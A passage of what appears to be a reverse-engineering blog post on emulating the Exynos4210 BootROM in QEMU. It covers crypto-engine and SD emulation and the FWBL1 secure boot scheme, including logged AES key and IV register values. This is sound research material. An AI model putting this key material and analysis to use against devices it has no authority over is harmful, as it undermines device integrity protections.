  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x19&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;[...]&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x26&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_otp_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;66&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;Read&lt;/span&gt; &lt;span class="n"&gt;OTP&lt;/span&gt; &lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="mh"&gt;0x27&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Advanced Crypto Engine (ACE) emulation&lt;/h2&gt;
&lt;p&gt;Advanced Crypto Engine (ACE) peripheral performs hardware-accelerated cryptographic operations. ACE interface, composed of many Special Function Registers (SFR), is way more complex than the OTP one.
Fortunately, these SFR are &lt;a href="https://github.com/exynos4-sdk/uboot/blob/master/arch/arm/include/asm/arch-exynos/ace_sfr.h"&gt;documented in U-Boot source code&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Again, &lt;a href="https://github.com/frederic/qemu-exynos-bootrom/commit/4deef8737da3a683bc858e91eba5a588a2879b0a"&gt;our implementation&lt;/a&gt; is limited to features actually used by BootROM : only AES-CBC-128 operations are supported.&lt;/p&gt;
&lt;p&gt;When BootROM is executed, QEMU debug log details how ACE peripheral is used :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Set AES key, IV, and other parameters (&lt;strong&gt;ACE_AES_CONTROL&lt;/strong&gt; register) :&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_AES_CONTROL&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0200&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x0e8b&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_AES_KEY5&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0290&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0xebc4ad63&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_AES_KEY6&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0294&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x27239f1a&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_AES_KEY7&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0298&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x230ce305&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_AES_KEY8&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x029c&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0xcaad75d2&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_AES_IV1&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0230&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0xee1c2939&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_AES_IV2&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0234&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x6be93160&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_AES_IV3&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0238&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0xd8bbf993&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_AES_IV4&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x023c&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x29b98fe8&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;315&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_FC_INTPEND&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x000c&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="mh"&gt;0x0000&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_FCINTPEND&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;227&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;QEMU&lt;/span&gt; &lt;span class="nl"&gt;ACE&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;FCINTPEND&lt;/span&gt; &lt;span class="n"&gt;triggered&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Set input &amp;amp; output buffer addresses (0x2021410), set buffer size (0x1bf0), and poll decryption process status (&lt;strong&gt;ACE_FC_INTPEND&lt;/strong&gt; register):&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_FC_BRDMAS&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0020&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x2021410&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_FC_BTDMAS&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0030&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x2021410&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_FC_BTDMAL&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0034&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x1bf0&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_FC_BRDMAL&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0024&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x1bf0&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;315&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_FC_INTPEND&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x000c&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="mh"&gt;0x0000&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_FCINTPEND&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;227&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;QEMU&lt;/span&gt; &lt;span class="nl"&gt;ACE&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;FCINTPEND&lt;/span&gt; &lt;span class="n"&gt;triggered&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_FCINTPEND&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;235&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;QEMU&lt;/span&gt; &lt;span class="nl"&gt;ACE&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;AES_control&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0xe8b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;FCBRDMAS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x2021410&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;FCBRDMAS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x1bf0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;FCBRDMAS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x2021410&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;FCBRDMAS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x1bf0&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_FC_INTPEND&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x000c&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x0004&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The log shows that 0x1bf0 bytes of data at address 0x2021410 are decrypted (&lt;strong&gt;ACE_AES_CONTROL[0]&lt;/strong&gt; bit) using AES-CBC mode (&lt;strong&gt;ACE_AES_CONTROL[2:1]&lt;/strong&gt; bits).&lt;/p&gt;
&lt;h2&gt;Minor fixes in SD/MMC Host controller&lt;/h2&gt;
&lt;p&gt;SD controller emulation is already fully supported by QEMU, however few minor differences causes BootROM to hang.&lt;/p&gt;
&lt;p&gt;First issue occurs when BootROM sends initialization command ACMD41 (SD_APP_OP_COND) multiple times. QEMU SD-card emulator only replies to the first attempt. &lt;a href="https://github.com/frederic/qemu-exynos-bootrom/commit/6f045949ee2fdec6248a8e438a38c212c2896927"&gt;Our patch&lt;/a&gt; ensures that SD-card always replies, even when SD-card state is already ready.&lt;/p&gt;
&lt;p&gt;Second issue is the lack of support for &lt;strong&gt;&lt;em&gt;SD Clock Enable&lt;/em&gt;&lt;/strong&gt; register in &lt;a href="https://www.sdcard.org/jp/developers/overview/host_controller/simple_spec/Simplified_SD_Host_Controller_Spec.pdf"&gt;Clock Control Register&lt;/a&gt;.
&lt;a href="https://github.com/frederic/qemu-exynos-bootrom/commit/9be5c9f2253dbc04ee690365f9e81eb1fbc00ee0"&gt;The patch&lt;/a&gt; implements it like defined in the &lt;a href="https://lists.gnu.org/archive/html/qemu-devel/2011-12/msg01271.html"&gt;original contribution&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Thanks to these changes, BootROM can perform SD operations. QEMU debug log shows that 0x2000 bytes are read at offset 0x200 :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SD: sd_blk_read: addr = 0x00000200, len = 512
SD: sd_blk_read: addr = 0x00000400, len = 512
SD: sd_blk_read: addr = 0x00000600, len = 512
SD: sd_blk_read: addr = 0x00000800, len = 512
SD: sd_blk_read: addr = 0x00000a00, len = 512
SD: sd_blk_read: addr = 0x00000c00, len = 512
SD: sd_blk_read: addr = 0x00000e00, len = 512
SD: sd_blk_read: addr = 0x00001000, len = 512
SD: sd_blk_read: addr = 0x00001200, len = 512
SD: sd_blk_read: addr = 0x00001400, len = 512
SD: sd_blk_read: addr = 0x00001600, len = 512
SD: sd_blk_read: addr = 0x00001800, len = 512
SD: sd_blk_read: addr = 0x00001a00, len = 512
SD: sd_blk_read: addr = 0x00001c00, len = 512
SD: sd_blk_read: addr = 0x00001e00, len = 512
SD: sd_blk_read: addr = 0x00002000, len = 512
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;These read operations match with encrypted FWBL1 image in bootloader partition previously dumped.&lt;/p&gt;
&lt;h1&gt;Executing BootROM in QEMU&lt;/h1&gt;
&lt;p&gt;We compile our modified &lt;a href="https://github.com/frederic/qemu-exynos-bootrom"&gt;QEMU&lt;/a&gt; and run :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ qemu-system-arm -machine smdkc210 -cpu cortex-a9 -s -S -bios ./bootrom.bin  -sd ./mmc_boot.img
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;-machine : emulated machine&lt;/li&gt;
&lt;li&gt;-s : Shorthand for -gdb tcp::1234&lt;/li&gt;
&lt;li&gt;-S : Do not start CPU at startup&lt;/li&gt;
&lt;li&gt;-bios : BootROM image file&lt;/li&gt;
&lt;li&gt;-sd : SD-card image file (equivalent to internal eMMC memory). We specify the path of bootloader dumped previously.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;From static analysis, we know that main BootROM function ends by jumping to IRAM at address &lt;strong&gt;0x02021410&lt;/strong&gt;. We can also notice that AES decryption took place at the same address.
We attach GDB and set a breakpoint to this address :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Breakpoint&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x02021410&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="o"&gt;??&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;layout&lt;/span&gt; &lt;span class="k"&gt;asm&lt;/span&gt;
&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="o"&gt;+&amp;gt;&lt;/span&gt; &lt;span class="mh"&gt;0x2021410&lt;/span&gt;       &lt;span class="n"&gt;b&lt;/span&gt;      &lt;span class="mh"&gt;0x2021434&lt;/span&gt;
    &lt;span class="mh"&gt;0x2021414&lt;/span&gt;       &lt;span class="n"&gt;b&lt;/span&gt;      &lt;span class="mh"&gt;0x2021414&lt;/span&gt;
    &lt;span class="mh"&gt;0x2021418&lt;/span&gt;       &lt;span class="n"&gt;b&lt;/span&gt;      &lt;span class="mh"&gt;0x2021418&lt;/span&gt;
    &lt;span class="mh"&gt;0x202141c&lt;/span&gt;       &lt;span class="n"&gt;b&lt;/span&gt;      &lt;span class="mh"&gt;0x202141c&lt;/span&gt;
    &lt;span class="mh"&gt;0x2021420&lt;/span&gt;       &lt;span class="n"&gt;b&lt;/span&gt;      &lt;span class="mh"&gt;0x2021420&lt;/span&gt;
    &lt;span class="mh"&gt;0x2021424&lt;/span&gt;       &lt;span class="n"&gt;b&lt;/span&gt;      &lt;span class="mh"&gt;0x2021424&lt;/span&gt;
    &lt;span class="mh"&gt;0x2021428&lt;/span&gt;       &lt;span class="n"&gt;b&lt;/span&gt;      &lt;span class="mh"&gt;0x2021428&lt;/span&gt;
    &lt;span class="mh"&gt;0x202142c&lt;/span&gt;       &lt;span class="n"&gt;b&lt;/span&gt;      &lt;span class="mh"&gt;0x202142c&lt;/span&gt;
    &lt;span class="mh"&gt;0x2021430&lt;/span&gt;       &lt;span class="n"&gt;b&lt;/span&gt;      &lt;span class="mh"&gt;0x2021430&lt;/span&gt;
    &lt;span class="mh"&gt;0x2021434&lt;/span&gt;       &lt;span class="n"&gt;mrc&lt;/span&gt;    &lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cr1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cr0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;GDB breaks at the exception vector table of decrypted FWBL1.&lt;/p&gt;
&lt;p&gt;After resuming execution, QEMU debug log shows that FWBL1 reads 0x4000 bytes from flash memory at address 0x2200 :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SD: sd_blk_read: addr = 0x00002200, len = 512
SD: sd_blk_read: addr = 0x00002400, len = 512
[...]
SD: sd_blk_read: addr = 0x00005e00, len = 512
SD: sd_blk_read: addr = 0x00006000, len = 512
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;But that's another story since BootROM execution is already over.&lt;/p&gt;
&lt;h1&gt;Secure boot analysis&lt;/h1&gt;
&lt;p&gt;Secure boot process aims to assert the authenticity of all software components in boot chain.
The first component in the chain is called root of trust, and in our case it's the BootROM. It loads, authenticates and decrypts the next component called FWBL1, stored in flash memory.&lt;/p&gt;
&lt;p&gt;The footer of FWBL1 contains metadata structures that BootROM parses to perform authentication.
Fortunately, these structures are defined in &lt;a href="https://github.com/medicalwei/u-boot-odroidxu-hyp/blob/master/arch/arm/cpu/armv7/exynos/uboot_sb21.h"&gt;U-Boot source tree&lt;/a&gt; :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define     SB20_MAX_SIGN_LEN       (2048/8)&lt;/span&gt;
&lt;span class="k"&gt;typedef&lt;/span&gt; &lt;span class="k"&gt;struct&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;SB20_RSAPubKey&lt;/span&gt;      &lt;span class="n"&gt;stage2PubKey&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt;         &lt;span class="n"&gt;code_SignedDataLen&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;       &lt;span class="n"&gt;code_SignedData&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;SB20_MAX_SIGN_LEN&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;SB20_PubKeyInfo&lt;/span&gt;     &lt;span class="n"&gt;pubKeyInfo&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;       &lt;span class="n"&gt;func_ptr_BaseAddr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;128&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;       &lt;span class="n"&gt;reservedData&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;SB20_CONTEXT&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Field &lt;strong&gt;code_SignedData&lt;/strong&gt; is the RSA-2048 signature of payload (FWBL1 code).&lt;/p&gt;
&lt;p&gt;Then, &lt;strong&gt;pubKeyInfo&lt;/strong&gt; structure contains information required to verify this signature :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define SB20_HMAC_SHA1_LEN          20&lt;/span&gt;
&lt;span class="k"&gt;typedef&lt;/span&gt; &lt;span class="k"&gt;struct&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;SB20_RSAPubKey&lt;/span&gt;      &lt;span class="n"&gt;rsaPubKey&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;       &lt;span class="n"&gt;signedData&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;SB20_HMAC_SHA1_LEN&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;SB20_PubKeyInfo&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;rsaPubKey&lt;/strong&gt; structure is the RSA public key, composed of modulus N and public exponent E.
&lt;strong&gt;signedData&lt;/strong&gt; is a HMAC of this key to ensure it hasn't been modified.&lt;/p&gt;
&lt;p&gt;So the authentication scenario of FWBL1 by BootROM is :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;verify HMAC of &lt;strong&gt;rsaPubKey&lt;/strong&gt; : &lt;strong&gt;signedData&lt;/strong&gt; == HMAC(&lt;strong&gt;Key&lt;/strong&gt;, &lt;strong&gt;rsaPubKey&lt;/strong&gt;)&lt;/li&gt;
&lt;li&gt;verify &lt;strong&gt;code_SignedData&lt;/strong&gt; signature using &lt;strong&gt;rsaPubKey&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Verifying HMAC value &lt;strong&gt;signedData&lt;/strong&gt; requires the same secret &lt;strong&gt;Key&lt;/strong&gt; that was used to generate it. However, static analysis reveals that &lt;strong&gt;Key&lt;/strong&gt; is not directly stored in device : it's in fact derived at runtime with a XOR operation applied to OTP value &lt;strong&gt;&lt;em&gt;OTP_key&lt;/em&gt;&lt;/strong&gt; and the HMAC &lt;strong&gt;signedData&lt;/strong&gt; itself :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Key&lt;/strong&gt; = &lt;strong&gt;signedData&lt;/strong&gt; ⊕ &lt;strong&gt;&lt;em&gt;OTP_key&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Since &lt;strong&gt;&lt;em&gt;OTP_key&lt;/em&gt;&lt;/strong&gt; is in read-only OTP memory, attacker cannot replace &lt;strong&gt;rsaPubKey&lt;/strong&gt; to forge a new signature, otherwise derivated &lt;strong&gt;Key&lt;/strong&gt; would be different and HMAC verification would fail.&lt;/p&gt;
&lt;p&gt;Finally, authenticated payload is decrypted using AES-CBC-128, with same &lt;strong&gt;Key&lt;/strong&gt; as the HMAC one (first 16 bytes only). IV is the SHA1 of &lt;strong&gt;rsaPubKey&lt;/strong&gt; (first 16 bytes).&lt;/p&gt;
